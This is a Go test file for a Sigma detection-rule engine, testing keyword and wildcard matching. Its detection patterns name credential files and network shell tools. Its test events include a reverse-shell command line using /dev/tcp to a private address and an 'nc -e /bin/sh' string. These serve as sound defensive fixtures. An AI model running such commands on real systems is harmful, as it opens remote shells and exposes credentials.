package sigma

import (
	"testing"

	"github.com/conor-sometimes/banken/internal/event"
)

// TestKeywordSelections covers Sigma "keyword" selections (a bare list of
// strings = match any of them in any field). Before this, such a rule failed
// to load ("list selection entry 0 is not a mapping"); ~25 of the SigmaHQ
// Linux rejects were exactly this.
func TestKeywordSelections(t *testing.T) {
	rule := `detection:
  keywords:
    - /etc/shadow
    - id_rsa
    - 'base64 -d'
  condition: keywords
`
	r := compileOK(t, rule)
	r.Name = "kw"

	cases := []struct {
		name string
		ev   event.Event
		want bool
	}{
		{"match in CommandLine", event.Event{CommandLine: "cat /etc/shadow"}, true},
		{"match in TargetFilename", event.Event{TargetFilename: "/home/u/.ssh/id_rsa"}, true},
		{"match a spaced keyword", event.Event{CommandLine: "echo x | base64 -d"}, true},
		{"no match", event.Event{CommandLine: "ls -la", Image: "/bin/ls"}, false},
		{"match in any field (Image)", event.Event{Image: "/tmp/id_rsa"}, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := r.Match(tc.ev); got != tc.want {
				t.Errorf("Match(%+v) = %v, want %v", tc.ev, got, tc.want)
			}
		})
	}
}

// TestKeywordWildcard: a wildcard inside a keyword is a substring (unanchored)
// match, unlike a wildcard on a named field (which is whole-field).
func TestKeywordWildcard(t *testing.T) {
	r := compileOK(t, "detection:\n  k:\n    - 'wget*http'\n  condition: k\n")
	r.Name = "kww"
	if !r.Match(event.Event{CommandLine: "sudo wget -q http://x/y"}) {
		t.Error("wildcard keyword should match as a substring")
	}
	if r.Match(event.Event{CommandLine: "curl http"}) {
		t.Error("wildcard keyword should not match without the 'wget' part")
	}
}

// TestKeywordMatcherEquivalence confirms the compiled matcher agrees with the
// authoritative Match for a keyword rule (the keyword's literal flows into the
// same all-fields scan the prefilter uses, so it stays exact).
func TestKeywordMatcherEquivalence(t *testing.T) {
	r := compileOK(t, "detection:\n  k:\n    - /dev/tcp/\n    - 'nc -e'\n  condition: k\n")
	r.Name = "kw"
	m := NewMatcher([]*Rule{r})
	for _, ev := range []event.Event{
		{CommandLine: "bash -c 'sh >& /dev/tcp/10.0.0.1/4444'"},
		{Image: "/usr/bin/nc -e /bin/sh"},
		{CommandLine: "nothing interesting"},
		{},
	} {
		want := r.Match(ev)
		got := len(m.Match(ev)) > 0
		if want != got {
			t.Errorf("event %+v: Match=%v matcher=%v", ev, want, got)
		}
	}
}
